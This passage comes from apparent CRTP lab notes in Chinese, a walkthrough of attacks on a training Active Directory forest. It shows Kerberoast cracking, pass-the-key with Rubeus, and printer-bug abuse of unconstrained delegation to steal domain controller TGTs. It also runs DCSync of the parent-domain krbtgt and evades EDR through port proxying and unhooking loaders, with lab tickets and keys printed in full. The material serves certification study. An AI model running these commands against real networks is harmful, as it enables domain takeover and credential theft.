<p>去掉:1443就可以了（因为其实这个有俩spn，另一个是不带:1433的，rubeus只获取第一个）</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-48.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\john-1.9.0-jumbo-1-win64\run\john.exe C:\ad\tools\hashes.txt --wordlist=C:\ad\tools\kerberoast\10k-worst-pass.txt</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-47.png" alt="alt text"></p>
<p>所以flag是 <code>MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local</code></p>
<h2 id="Learning-Objective-15-1"><a href="#Learning-Objective-15-1" class="headerlink" title="Learning Objective - 15 - 1"></a>Learning Objective - 15 - 1</h2><blockquote>
<p>Domain user who is a local admin on dcorp-appsrv</p>
</blockquote>
<blockquote>
<p>域用户哪一个是dcorp-appsrv的localadmin</p>
</blockquote>
<p>直接用域管上去看下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; winrs -r:dcorp-appsrv cmd</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2762]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator.dcorp&gt;net localgroup administrators</span><br><span class="line">net localgroup administrators</span><br><span class="line">Alias name     administrators</span><br><span class="line">Comment        Administrators have complete and unrestricted access to the computer/domain</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">dcorp\appadmin</span><br><span class="line">dcorp\Domain Admins</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>flag是 <code>appadmin</code></p>
<h2 id="Learning-Objective-15-2"><a href="#Learning-Objective-15-2" class="headerlink" title="Learning Objective - 15 - 2"></a>Learning Objective - 15 - 2</h2><blockquote>
<p>Which user’s credentials are compromised by using the printer bug for compromising dollarcorp</p>
</blockquote>
<blockquote>
<p>哪个dollarcorp域内用户可以被打印机漏洞窃取凭证</p>
</blockquote>
<p>还是在 dcorp-appsrv 机器做，因为要用打印机漏洞所以是非约束委派的利用。</p>
<p>先枚举开了非约束委派的账户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-domainobject</span> |?&#123;<span class="variable">$_</span>.useraccountcontrol <span class="operator">-match</span> <span class="string">&quot;TRUSTED_FOR_DELEGATION&quot;</span>&#125;|<span class="built_in">select</span> name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">DCORP<span class="literal">-APPSRV</span></span><br><span class="line">DCORP<span class="literal">-DC</span></span><br></pre></td></tr></table></figure>

<p>只有dcorp-dc和dcorp-appsrv，因为我们在appsrv上，所以这个flag打印机漏送利用的目标就是 <code>dcorp-dc</code> 机器。</p>
<p>为了模拟场景，这里注入一下DCORP-APPSRV的localadmin的用户appadmin的票据（就不用域管了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools&gt; .\Loader.exe -path .\Rubeus.exe -args asktgt /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /ptt</span><br></pre></td></tr></table></figure>

<p>然后远程过去</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-49.png" alt="alt text"></p>
<p>加一下代理方便规避mde</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=172.16.100.22</span><br></pre></td></tr></table></figure>

<p>落地一下loader.exe ，（只有localadmin可以开监听）加载rubeus开监听方便一会拿TGT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1:8080/loader.exe -o loader.exe</span><br></pre></td></tr></table></figure>

<p>rubeus开一下监听模式，5秒刷新一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe -path http://127.0.0.1:8080/rubeus.exe -args monitor /interval:5 /nowrap</span><br></pre></td></tr></table></figure>

<p>然后发现这鸟机器请求的有点多，还是加个目标用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe -path http://127.0.0.1:8080/rubeus.exe -args monitor /interval:5 /nowrap /targetuser:dcorp-dc$</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-50.png" alt="alt text"></p>
<p>回到学生机器上触发dc机器用<code>MS-RPRN.exe</code>到appsrv的打印机漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>这里他会报错，但其实rubeus还是能接收到tgt的</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-51.png" alt="alt text"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\appadmin&gt; .\loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/rubeus.exe <span class="literal">-args</span> monitor /interval:<span class="number">5</span> /nowrap /targetuser:dcorp<span class="literal">-dc</span><span class="variable">$</span></span><br><span class="line">.\loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/rubeus.exe <span class="literal">-args</span> monitor /interval:<span class="number">5</span> /nowrap /targetuser:dcorp<span class="literal">-dc</span><span class="variable">$</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/rubeus.exe Arguments : monitor /interval:<span class="number">5</span> /nowrap /targetuser:dcorp<span class="literal">-dc</span><span class="variable">$</span></span><br><span class="line">[*] Action: TGT Monitoring</span><br><span class="line">[*] Target user     : dcorp<span class="literal">-dc</span><span class="variable">$</span></span><br><span class="line">[*] Monitoring every <span class="number">5</span> seconds <span class="keyword">for</span> new TGTs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">04</span>:<span class="number">00</span> AM UTC - Found new TGT:</span><br><span class="line"></span><br><span class="line">  User                  :  DCORP<span class="literal">-DC</span><span class="variable">$</span>@DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">  StartTime             :  <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">33</span>:<span class="number">46</span> AM</span><br><span class="line">  EndTime               :  <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">33</span>:<span class="number">46</span> AM</span><br><span class="line">  RenewTill             :  <span class="number">6</span>/<span class="number">2</span>/<span class="number">2025</span> <span class="number">3</span>:<span class="number">03</span>:<span class="number">19</span> PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSgAskErHNraj2QYuoJcxsBiu2143YDfh5/<span class="number">59</span>A6K+sjcAN6pc9QcR3nbi0E8uJqTmTAnjeRSnRNXP5v4GtN0ewo4wkoFIKd2H0OqehIjxazkVeX2<span class="built_in">h</span>+TJrEWc141J4mDTn1Zkw6GbGnIskN4+vjZwKUHB6JKROIP6hj3vyhTgsEq1LmukGZB4ej6RtLlEvjD31bz+OmgY0IRTkUhzPQSQA90OsyMN5N7oOP4JytWSHz6ByvmFfXbf2Urly/nfxzI6NL3p9bqcpfrG9VxxXWYv93FHhxYKAO3OqlDIIb6VbewAEXCeN5GDcshz6pBJRLSI6QyYCy0PIUcsciec7OtVsdJUsk8R1GQslDwab7imFBU2Z0yOFAGwyvEvHKjKalgmEXAyWx0SmNnZP8OBZmDUK2+jsRFXcPehMtESbOQ+sWa92HuHyxP0VtZAl2I/NwHssF7vUM8kgaLsrAV7zN+wK3Fv1jtFlGZ4jile0bt4ZZm2miB6nsv/<span class="number">4</span>nFpS2Uxsw2//b5atkvmXYVPrmfVELH9IhUCYi2pDRZ6iKW/QCx34jQMi1W0vHeO4Z6kQ7uwaBbNPpxX23jcPhXZJYeurALQr5yaeNHYWydK6WUvVPjDRgK/HFKbZCrW35KeqID4KYESvHtBuhOo9xKcoFdMbB4duKZ+wOki651KuTno7L1dmsnc/u+<span class="number">8</span>ypnFc5LFBz32ZQw5YIfgf2HKyGrHxslm1my8oDYhZ1VqJNVjWtJ0wltRKbJ55w+Nhc+h4iDWyYCb9HOmm3h6FnDAkjD1Hp4U+BZrctwYsmVQs+<span class="number">2</span>OwMoisthbkeZpG0QIhGXdPE6E7af0189hq5mI06AphxX+j6ffWdeTQf14WyE5gkmykgsin+ldU8ffzLX5SsuqABLrq5eaGeBENrSo5A5xi7m1Bq9TqD+N1wR0NgpRXnerqL+sLH88APeBwfrgiOzI58FRKKUvNDt7XAhBp5pIGOAfFAXr04MsxbZUNIYW8LqRZh9HfHSP4g577zAD+<span class="number">259</span>GEJHCrc2dD+<span class="number">7</span>Jd1BTJJ55MPHROnP990SJChFDPcUwJdMjnKum90/n5HJASF6Hcs2rY62PjgGa22AQ3DRGzzHeuBKcRshwl3r3DSwB1FJxojsHib+wgTzsU77ngi39Hi3FcHIp90Fv+iwxvUz0mVxJwCnb5KP7hT6gCRMQNBnVSF2pGWJyUBoDoG6d8drxLuzx3l7Ta/<span class="number">68</span>YCeyPCLeOeqSHM0fPxsg8lz/<span class="number">8</span>/MBbKwGMO9ASMvs/GSls0JHVNLesfs5Os1yTo16czlKg/t3LL8O7AB/T3SRrZSU1q5ph4/<span class="number">1</span>d8Fb/MxZrSpQWJIx+ooybu58L4RS0daqWSwgmkO66oLARhawwNba7kqhOmj63YV0lgCnXBYguQjZnPnAuLN0xzcsZilBWOhqOVWGJLu9/Ehr+chOn8iv1xuH1vbNZX9Xdrtfwp26qwIUVaoYzFrCJeKrXMrxpsQ/GoOkLAW5AK0ZWgqCdPgLMXmb4Zq1b1p+<span class="number">7</span>JIlXLOKTYlrKd30KUKHJ56nAkzLa74Or021a9undYoQ8xVmH4DtQwg7p0fqtIb6ZqNL8C1f7ucGynRcGjggEVMIIBEaADAgEAooIBCASCAQR9ggEAMIH9oIH6MIH3MIH0oCswKaADAgESoSIEIIuswGSobL0/b5NTCeK7+EOBtpjWLPJHOO3ADvFa8V71oRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohYwFKADAgEBoQ0wCxsJRENPUlAtREMkowcDBQBgoQAApREYDzIwMjUwNTI3MDczMzQ2WqYRGA8yMDI1MDUyNzE3MzM0NlqnERgPMjAyNTA2MDIyMjAzMTlaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[*] Ticket cache size: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后回到学生机器，先清理票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure>

<p>再注入dc$机器的TGT到进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe -path .\Rubeus.exe -args ptt /ticket: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</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-52.png" alt="alt text"></p>
<p>现在就有票据里</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-53.png" alt="alt text"></p>
<p>因为是dc$的票，所以就可以去dcsync了</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-54.png" alt="alt text"></p>
<p><img src="/wpimages/2025/crtp-lab-note/image-55.png" alt="alt text"></p>
<h3 id="拿根域管理"><a href="#拿根域管理" class="headerlink" title="拿根域管理"></a>拿根域管理</h3><p>同理，在双向信任的情况下让<strong>父域域控</strong>通过打印机漏洞触发也是可以的</p>
<p>先确定父域域控</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainController</span> <span class="literal">-Domain</span> moneycorp.local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Forest                     : moneycorp.local</span><br><span class="line">CurrentTime                : <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">49</span>:<span class="number">05</span> AM</span><br><span class="line">HighestCommittedUsn        : <span class="number">317261</span></span><br><span class="line">OSVersion                  : Windows Server <span class="number">2022</span> Standard</span><br><span class="line">Roles                      : &#123;SchemaRole, NamingRole, PdcRole, RidRole...&#125;</span><br><span class="line">Domain                     : moneycorp.local</span><br><span class="line">IPAddress                  : <span class="number">172.16</span>.<span class="number">1.1</span></span><br><span class="line">SiteName                   : Default<span class="literal">-First-Site-Name</span></span><br><span class="line">SyncFromAllServersCallback :</span><br><span class="line">InboundConnections         : &#123;<span class="number">29</span>f15465<span class="literal">-5ef6-4d0a-b600-87bf6f56a5a8</span>, cb4a4e84<span class="literal">-ab09-4e4a-8365-a28ffac2d701</span>&#125;</span><br><span class="line">OutboundConnections        : &#123;f06c66a3<span class="literal">-2e50-4f42-8078-d022cbf1db27</span>, <span class="number">38</span>e5d7<span class="built_in">cd</span><span class="literal">-72fd-4b39-bcbf-9761d5a4c018</span>&#125;</span><br><span class="line">Name                       : mcorp<span class="literal">-dc</span>.moneycorp.local</span><br><span class="line">Partitions                 : &#123;DC=moneycorp,DC=local, CN=Configuration,DC=moneycorp,DC=local, CN=Schema,CN=Configuration,DC=moneycorp,DC=local,</span><br><span class="line">                             DC=DomainDnsZones,DC=moneycorp,DC=local...&#125;</span><br></pre></td></tr></table></figure>

<p>确定为 <code>mcorp-dc.moneycorp.local</code> 之后 ，修改监听对象为父域域控的 <code>mcorp-dc$</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/Rubeus.exe <span class="literal">-args</span> monitor /targetuser:mcorp<span class="literal">-DC</span><span class="variable">$</span> /interval:<span class="number">5</span> /nowrap</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-56.png" alt="alt text"></p>
<p>再次通过打印机漏洞触发，<strong>这次源是mcorp-dc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>就接到了</p>
<p>（<strong>这里有时候好用，有时候得断开rubeus再重试一下</strong>）</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-57.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p>导入一下</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-58.png" alt="alt text"></p>
<p>确认一下</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-59.png" alt="alt text"></p>
<p>然后就可以对 <code>moneycorp.local</code> 的域dcsync了，<strong>这里要注意改netbios 以及附带目标域</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools&gt; .\loader <span class="literal">-path</span> .\SafetyKatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\SafetyKatz.exe Arguments : lsadump::evasive<span class="literal">-dcsync</span> /user:mcorp\krbtgt /domain:moneycorp.local <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        